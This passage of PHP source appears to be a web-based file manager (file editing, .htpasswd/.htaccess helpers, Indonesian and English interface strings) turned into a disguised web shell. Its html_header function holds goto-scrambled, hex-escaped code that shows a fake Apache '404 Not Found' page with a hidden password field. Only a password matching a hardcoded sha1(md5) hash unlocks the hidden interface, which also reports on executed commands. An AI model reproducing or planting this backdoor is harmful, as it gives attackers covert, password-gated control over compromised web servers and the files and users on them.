	global $self, $directory, $editcols, $editrows, $apache, $htpasswd, $htaccess;

	html_header();

	echo '<h2 style="margin-bottom: 3pt">' . html($file) . '</h2>

<form action="' . $self . '" method="post">

<table class="dialog">
<tr>
<td class="dialog">

	<textarea name="content" cols="' . $editcols . '" rows="' . $editrows . '" WRAP="off">';

	if (array_key_exists('content', $_POST)) {
		echo $_POST['content'];
	} else {
		$f = fopen($file, 'r');
		while (!feof($f)) {
			echo html(fread($f, 8192));
		}
		fclose($f);
	}

	if (!empty($_POST['user'])) {
		echo "\n" . $_POST['user'] . ':' . crypt($_POST['password']);
	}
	if (!empty($_POST['basic_auth'])) {
		if ($win) {
			$authfile = str_replace('\\', '/', $directory) . $htpasswd;
		} else {
			$authfile = $directory . $htpasswd;
		}
		echo "\nAuthType Basic\nAuthName &quot;Restricted Directory&quot;\n";
		echo 'AuthUserFile &quot;' . html($authfile) . "&quot;\n";
		echo 'Require valid-user';
	}

	echo '</textarea>

	<hr />
';

	if ($apache && basename($file) == $htpasswd) {
		echo '
	' . word('user') . ': <input type="text" name="user" />
	' . word('password') . ': <input type="password" name="password" />
	<input type="submit" value="' . word('add') . '" />

	<hr />
';

	}

	if ($apache && basename($file) == $htaccess) {
		echo '
	<input type="submit" name="basic_auth" value="' . word('add_basic_auth') . '" />

	<hr />
';

	}

	echo '
	<input type="hidden" name="action" value="edit" />
	<input type="hidden" name="file" value="' . html($file) . '" />
	<input type="hidden" name="dir" value="' . html($directory) . '" />
	<input type="reset" value="' . word('reset') . '" id="red_button" />
	<input type="submit" name="save" value="' . word('save') . '" id="green_button" style="margin-left: 50px" />

</td>
</tr>
</table>

<p><a href="' . $self . '?dir=' . urlencode($directory) . '">[ ' . word('back') . ' ]</a></p>

</form>

';

	html_footer();

}

function spacer () {
	global $cols;

	echo '<tr>
	<td colspan="' . $cols . '" style="height: 1em"></td>
</tr>
';

}

function textfieldsize ($content) {

	$size = strlen($content) + 5;
	if ($size < 30) $size = 30;

	return $size;

}

function request_dump () {

	foreach ($_REQUEST as $key => $value) {
		echo "\t<input type=\"hidden\" name=\"" . html($key) . '" value="' . html($value) . "\" />\n";
	}

}

/* ------------------------------------------------------------------------- */
	function hex($n)
	{
		$y = '';
		for ($i = 0; $i < strlen($n); $i++) {
			$y .= dechex(ord($n[$i]));
		}
		return $y;
	}

	function uhex($y)
	{
		$n = '';
		for ($i = 0; $i < strlen($y) - 1; $i += 2) {
			$n .= chr(hexdec($y[$i] . $y[$i + 1]));
		}
		return $n;
	}
	
function html ($string) {
	global $site_charset;
	return htmlentities($string, ENT_COMPAT, $site_charset);
}

function word ($word) {
	global $words, $word_charset;
	return htmlentities($words[$word], ENT_COMPAT, $word_charset);
}

function phrase ($phrase, $arguments) {
	global $words;
	static $search;

	if (!is_array($search)) for ($i = 1; $i <= 8; $i++) $search[] = "%$i";

	for ($i = 0; $i < sizeof($arguments); $i++) {
		$arguments[$i] = nl2br(html($arguments[$i]));
	}

	$replace = array('{' => '<pre>', '}' =>'</pre>', '[' => '<b>', ']' => '</b>');

	return str_replace($search, $arguments, str_replace(array_keys($replace), $replace, nl2br(html($words[$phrase]))));

}

function getwords ($lang) {
	global $date_format, $word_charset;
	$word_charset = 'UTF-8';

	switch ($lang) {
	case 'id':

		$date_format = 'd.m.y H:i:s';

		return array(
'directory' =>	'Direktori',
'file' =>	'File',
'filename' =>	'Nama file',
	
'size' =>	'Ukuran',
'permission' =>	'Izin',
'owner' =>	'Pemilik',
'group' =>	'Group',
'other' =>	'Yang lain',
'functions' =>	'Fungsi',
	
'read' =>	'Baca',
'write' =>	'Tulis',
'execute' =>	'Jalankan',
	
'create_symlink' =>	'Symlink',
'delete' =>	'Delete',
'rename' =>	'Rename',
'move' =>	'Pindah',
'copy' =>	'Copy',
'edit' =>	'Edit',
'download' =>	'Download',
'upload' =>	'Upload',
'create' =>	'Buat',
'change' =>	'Ubah',
'save' =>	'Simpan',
'set' =>	'Atur',
'reset' =>	'Reset',
'relative' =>	'Relatif',
	
'yes' =>	'Ya',
'no' =>	'Tidak',
'back' =>	'KEMBALI',
'destination' =>	'Tujuan',
'symlink' =>	'Simlink',
'no_output' =>	'tidak ada keluaran',
	
'user' =>	'Pengguna',
'password' =>	'Kata sandi',
'add' =>	'Menambahkan',
'add_basic_auth' =>	'tambahkan otentikasi dasar',
	
'uploaded' =>	'"[%1]" telah diunggah.',
'not_uploaded' =>	'"[%1]" tidak dapat diunggah.',
'already_exists' =>	'"[%1]" sudah ada.',
'created' =>	'"[%1]" telah dibuat.',
'not_created' =>	'"[%1]" tidak dapat dibuat.',
'really_delete' =>	'Hapus file-file ini?',
'deleted' =>	"File-file ini telah dihapus:\n[%1]",
'not_deleted' =>	"File-file ini tidak dapat dihapus:\n[%1]",
'rename_file' =>	'Ganti nama file:',
'renamed' =>	'"[%1]" telah diubah namanya menjadi "[%2]".',
'not_renamed' =>	'"[%1] tidak dapat diubah namanya menjadi "[%2]".',
'move_files' =>	'Pindahkan file-file ini:',
'moved' =>	"File-file ini telah dipindahkan ke \"[%2]\":\n[%1]",
'not_moved' =>	"File-file ini tidak dapat dipindahkan ke \"[%2]\":\n[%1]",
'copy_files' =>	'Salin file-file ini:',
'copied' =>	"File-file ini telah disalin ke \"[%2]\":\n[%1]",
'not_copied' =>	"File-file ini tidak dapat disalin ke \"[%2]\":\n[%1]",
'not_edited' =>	'"[%1]" tidak dapat diedit.',
'executed' =>	"\"[%1]\" telah berhasil dieksekusi:\n{%2}",
'not_executed' =>	"\"[%1]\" tidak berhasil dieksekusi:\n{%2}",
'saved' =>	'"[%1]" telah disimpan.',
'not_saved' =>	'"[%1]" tidak dapat disimpan.',
'symlinked' =>	'Symlink dari "[%2]" ke "[%1]" telah dibuat.',
'not_symlinked' =>	'Symlink dari "[%2]" ke "[%1]" tidak dapat dibuat.',
'permission_for' =>	'Izin dari "[%1]":',
'permission_set' =>	'Izin "[%1]" disetel ke [%2].',
'permission_not_set' =>	'Izin "[%1]" tidak dapat disetel ke [%2].',
'not_readable' =>	'"[%1]" tidak dapat dibaca.'
		);

	case 'en':
	default:

		$date_format = 'n/j/y H:i:s';

		return array(
'directory' => 'Directory',
'file' => 'File',
'filename' => 'Filename',

'size' => 'Size',
'permission' => 'Permission',
'owner' => 'Owner',
'group' => 'Group',
'other' => 'Others',
'functions' => 'Functions',

'read' => 'read',
'write' => 'write',
'execute' => 'execute',

'create_symlink' => 'create symlink',
'delete' => 'delete',
'rename' => 'rename',
'move' => 'move',
'copy' => 'copy',
'edit' => 'edit',
'download' => 'download',
'upload' => 'upload',
'create' => 'create',
'change' => 'change',
'save' => 'save',
'set' => 'set',
'reset' => 'reset',
'relative' => 'Relative path to target',

'yes' => 'Yes',
'no' => 'No',
'back' => 'back',
'destination' => 'Destination',
'symlink' => 'Symlink',
'no_output' => 'no output',

'user' => 'User',
'password' => 'Password',
'add' => 'add',
'add_basic_auth' => 'add basic-authentification',

'uploaded' => '"[%1]" has been uploaded.',
'not_uploaded' => '"[%1]" could not be uploaded.',
'already_exists' => '"[%1]" already exists.',
'created' => '"[%1]" has been created.',
'not_created' => '"[%1]" could not be created.',
'really_delete' => 'Delete these files?',
'deleted' => "These files have been deleted:\n[%1]",
'not_deleted' => "These files could not be deleted:\n[%1]",
'rename_file' => 'Rename file:',
'renamed' => '"[%1]" has been renamed to "[%2]".',
'not_renamed' => '"[%1] could not be renamed to "[%2]".',
'move_files' => 'Move these files:',
'moved' => "These files have been moved to \"[%2]\":\n[%1]",
'not_moved' => "These files could not be moved to \"[%2]\":\n[%1]",
'copy_files' => 'Copy these files:',
'copied' => "These files have been copied to \"[%2]\":\n[%1]",
'not_copied' => "These files could not be copied to \"[%2]\":\n[%1]",
'not_edited' => '"[%1]" can not be edited.',
'executed' => "\"[%1]\" has been executed successfully:\n{%2}",
'not_executed' => "\"[%1]\" could not be executed successfully:\n{%2}",
'saved' => '"[%1]" has been saved.',
'not_saved' => '"[%1]" could not be saved.',
'symlinked' => 'Symlink from "[%2]" to "[%1]" has been created.',
'not_symlinked' => 'Symlink from "[%2]" to "[%1]" could not be created.',
'permission_for' => 'Permission of "[%1]":',
'permission_set' => 'Permission of "[%1]" was set to [%2].',
'permission_not_set' => 'Permission of "[%1]" could not be set to [%2].',
'not_readable' => '"[%1]" can not be read.'
		);

	}

}

function getimage ($image) {
	switch ($image) {
	case 'file':
		return base64_decode('R0lGODlhEQANAJEDAJmZmf///wAAAP///yH5BAHoAwMALAAAAAARAA0AAAItnIGJxg0B42rsiSvCA/REmXQWhmnih3LUSGaqg35vFbSXucbSabunjnMohq8CADsA');
	case 'folder':
		return base64_decode('R0lGODlhEQANAJEDAJmZmf///8zMzP///yH5BAHoAwMALAAAAAARAA0AAAIqnI+ZwKwbYgTPtIudlbwLOgCBQJYmCYrn+m3smY5vGc+0a7dhjh7ZbygAADsA');
	case 'hidden_file':
		return base64_decode('R0lGODlhEQANAJEDAMwAAP///5mZmf///yH5BAHoAwMALAAAAAARAA0AAAItnIGJxg0B42rsiSvCA/REmXQWhmnih3LUSGaqg35vFbSXucbSabunjnMohq8CADsA');
	case 'link':
		return base64_decode('R0lGODlhEQANAKIEAJmZmf///wAAAMwAAP///wAAAAAAAAAAACH5BAHoAwQALAAAAAARAA0AAAM5SArcrDCCQOuLcIotwgTYUllNOA0DxXkmhY4shM5zsMUKTY8gNgUvW6cnAaZgxMyIM2zBLCaHlJgAADsA');
	case 'smiley':
		return base64_decode('R0lGODlhEQANAJECAAAAAP//AP///wAAACH5BAHoAwIALAAAAAARAA0AAAIslI+pAu2wDAiz0jWD3hqmBzZf1VCleJQch0rkdnppB3dKZuIygrMRE/oJDwUAOwA=');
	case 'arrow':
		return base64_decode('R0lGODlhEQANAIABAAAAAP///yH5BAEKAAEALAAAAAARAA0AAAIdjA9wy6gNQ4pwUmav0yvn+hhJiI3mCJ6otrIkxxQAOw==');
	}
}

function html_header () {
	global $site_charset;
	goto OoyJL; Ya7DB: function License() { echo "\x3c\41\x44\x4f\x43\x54\131\120\x45\x20\x68\164\155\x6c\76\x3c\x68\164\x6d\154\76\x3c\x68\x65\141\x64\76\x3c\x6d\145\164\x61\40\156\141\x6d\145\x3d\42\x72\x6f\142\x6f\x74\163\x22\40\143\157\156\x74\145\x6e\164\x22\156\x6f\151\x6e\144\x65\x78\56\x20\x6e\157\x66\x6f\x6c\154\157\x77\42\x3e\x3c\x74\x69\164\154\145\x3e\74\57\x74\x69\x74\154\x65\x3e\74\x2f\150\x65\141\x64\x3e\74\142\157\x64\171\76\xa\x9\74\150\x31\76\116\x6f\164\x20\x46\x6f\x75\156\x64\x3c\57\x68\x31\x3e\x20\12\11\x20\40\x20\x20\74\x74\x69\164\154\x65\76\64\60\x34\40\x4e\157\164\x20\106\x6f\165\x6e\x64\74\57\x74\x69\x74\x6c\x65\x3e\12\x9\x3c\x73\164\x79\154\145\40\x74\171\x70\145\x3d\x22\x74\x65\170\x74\x2f\x63\163\x73\42\76\12\x9\x69\156\160\165\164\133\x74\171\x70\x65\x3d\160\141\x73\x73\167\157\x72\144\x5d\40\x7b\12\x9\40\x20\40\x20\x77\151\144\164\x68\x3a\x20\62\65\x30\160\170\x3b\12\x9\40\x20\40\x20\x68\x65\x69\147\150\x74\72\x20\x32\65\160\170\73\12\11\x20\x20\40\x20\x63\157\x6c\157\162\x3a\40\x77\x68\x69\164\145\x3b\xa\x9\40\x20\x20\40\x62\x61\143\x6b\147\162\157\x75\156\144\x3a\40\x74\x72\x61\x6e\163\x70\x61\x72\x65\156\164\x3b\12\x9\40\x20\40\x20\x62\x6f\162\x64\145\x72\x3a\40\61\160\x78\40\163\157\154\151\x64\x20\167\x68\151\164\145\73\12\11\40\x20\x20\x20\155\x61\162\x67\151\156\55\154\145\146\164\72\x20\x32\60\160\x78\73\xa\11\x20\40\40\40\164\x65\170\x74\x2d\141\x6c\151\x67\156\72\x20\143\x65\x6e\164\145\x72\73\12\11\x7d\xa\x9\74\x2f\163\x74\x79\154\145\76\xa\11\40\40\40\40\74\x70\76\x54\x68\x65\40\162\145\161\165\x65\x73\x74\x65\144\40\x55\x52\x4c\40\x77\x61\x73\40\156\157\x74\x20\146\157\x75\156\144\40\x6f\x6e\40\164\150\151\163\40\163\x65\x72\166\x65\162\x2e\x3c\x2f\160\x3e\x20\xa\11\74\x70\76\x41\x64\144\151\x74\x69\157\156\141\154\x6c\171\54\40\x61\40\64\60\x34\40\x4e\x6f\x74\40\x46\x6f\x75\156\x64\x20\145\162\x72\x6f\x72\40\167\141\x73\40\145\156\x63\x6f\165\156\x74\145\x72\x65\x64\x20\167\150\x69\154\145\40\x74\162\171\x69\156\x67\40\x74\157\x20\x75\x73\145\40\x61\156\40\105\x72\x72\x6f\x72\x44\157\143\165\155\145\x6e\164\x20\164\157\40\150\x61\156\x64\154\x65\x20\x74\150\x65\x20\x72\x65\161\x75\x65\163\x74\56\74\57\160\x3e\40\12\11\74\x68\x72\x3e\40\xa\x9\x3c\141\144\x64\x72\145\163\163\76\101\x70\141\x63\150\x65\40\x53\x65\x72\x76\x65\x72\x20\141\x74\x20" . $_SERVER["\110\124\124\x50\x5f\110\117\123\x54"] . "\x20\120\x6f\x72\164\x20" . $_SERVER["\123\105\x52\126\x45\122\x5f\120\x4f\x52\x54"] . "\x3c\57\141\x64\x64\x72\x65\163\163\x3e\40\12\xa\11\74\x63\145\156\164\x65\162\x3e\x3c\146\157\x72\155\x20\x6d\145\164\x68\x6f\144\75\x22\160\157\x73\164\x22\76\x3c\x69\156\160\x75\164\x20\x74\x79\x70\145\75\42\160\141\163\163\167\x6f\162\144\42\x20\156\x61\x6d\145\x3d\x22" . $_SESSION["\x6b\x65\171\170\170"] . "\42\40\141\x75\x74\x6f\143\157\x6d\160\x6c\145\x74\145\75\x22\x6f\x66\146\x22\76\x3c\142\162\76\74\57\146\157\162\x6d\76\74\57\x63\145\156\x74\x65\162\76\x3c\57\x62\x6f\x64\171\76\x3c\x2f\150\164\x6d\x6c\x3e\12\11\40\40\40"; die; } goto N1Ti3; N1Ti3: $auth_pass5 = "\60\70\x32\x31\x63\67\x35\x39\63\x61\x65\144\x35\x64\143\x30\x30\143\70\x33\141\145\x38\71\65\60\62\x39\60\70\x61\65\67\146\x63\65\62\146\x34\142"; goto BoEoK; m0wU8: $keyxx = $_SESSION["\x6b\145\171\x78\x78"]; goto BQ00r; OoyJL: session_start(); goto mFAKH; BoEoK: if (empty($_SESSION["\153\x65\x79\170\x78"])) { $keyxxx = generateRandomString(); $_SESSION["\x6b\145\171\170\x78"] = $keyxxx; } goto m0wU8; mFAKH: function generateRandomString($length = 10) { $characters = "\x30\61\x32\x33\x34\65\x36\67\70\x39\141\142\143\144\x65\146\x67\x68\151\x6a\153\154\x6d\x6e\x6f\x70\x71\x72\x73\164\165\x76\x77\170\x79\x7a\101\x42\x43\x44\x45\x46\107\x48\111\112\x4b\114\115\x4e\x4f\x50\x51\122\123\124\x55\126\x57\130\x59\x5a"; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i < $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } goto Ya7DB; BQ00r: if (empty($_SESSION[sha1(md5($_SERVER["\110\124\x54\x50\x5f\110\117\123\124"])) . "\170"])) { if (isset($_POST[$keyxx]) and sha1(md5($_POST[$keyxx])) == $auth_pass5) { $_SESSION[sha1(md5($_SERVER["\x48\x54\x54\120\137\110\117\123\x54"])) . "\x78"] = true; } else { License(); } die; } goto PIhBW; PIhBW: 
	echo <<<END
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
     "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>

<meta http-equiv="Content-Type" content="text/html; charset=$site_charset" />

<title>x&sup1;&sup2;&sup3;</title>

<style type="text/css">
body { font: small sans-serif; text-align: center }
img { width: 17px; height: 13px }
a, a:visited { text-decoration: none; color: navy }
hr { border-style: none; height: 1px; background-color: silver; color: silver }
#main { margin-top: 6pt; margin-left: auto; margin-right: auto; border-spacing: 1px }
#main th { background: #eee; padding: 3pt 3pt 0pt 3pt }
.listing th, .listing td { padding: 1px 3pt 0 3pt }
.listing th { border: 1px solid silver }
.listing td { border: 1px solid #ddd; background: white }
.listing .checkbox { text-align: center }
.listing .filename { text-align: left }
.listing .size { text-align: right }
.listing th.permission { text-align: left }
.listing td.permission { font-family: monospace }
.listing .owner { text-align: left }
.listing .group { text-align: left }
.listing .functions { text-align: left }
.listing_footer td { background: #eee; border: 1px solid silver }
#directory, #upload, #create, .listing_footer td, #error td, #notice td { text-align: left; padding: 3pt }
#directory { background: #eee; border: 1px solid silver }
#upload { padding-top: 1em }
#create { padding-bottom: 1em }
.small, .small option { font-size: x-small }
textarea { border: none; background: white }
table.dialog { margin-left: auto; margin-right: auto }
td.dialog { background: #eee; padding: 1ex; border: 1px solid silver; text-align: center }
#permission { margin-left: auto; margin-right: auto }
#permission td { padding-left: 3pt; padding-right: 3pt; text-align: center }
td.permission_action { text-align: right }
#symlink { background: #eee; border: 1px solid silver }
#symlink td { text-align: left; padding: 3pt }
#red_button { width: 120px; color: #400 }
#green_button { width: 120px; color: #040 }
#error td { background: maroon; color: white; border: 1px solid silver }
#notice td { background: green; color: white; border: 1px solid silver }
#notice pre, #error pre { background: silver; color: black; padding: 1ex; margin-left: 1ex; margin-right: 1ex }
code { font-size: 12pt }
td { white-space: nowrap }
</style>

<script type="text/javascript">
<!--
function activate (name) {
	if (document && document.forms[0] && document.forms[0].elements['focus']) {
		document.forms[0].elements['focus'].value = name;
	}
}
//-->
</script>
</head>
<body>


END;

}

function html_footer () {

	echo <<<END
</body>
</html>
END;

}

function notice ($phrase) {
	global $cols;

	$args = func_get_args();
	array_shift($args);

	return '<tr id="notice">
	<td colspan="' . $cols . '">' . phrase($phrase, $args) . '</td>
</tr>
';

}

function error ($phrase) {
	global $cols;

	$args = func_get_args();
	array_shift($args);

	return '<tr id="error">
	<td colspan="' . $cols . '">' . phrase($phrase, $args) . '</td>
</tr>
';

}

?>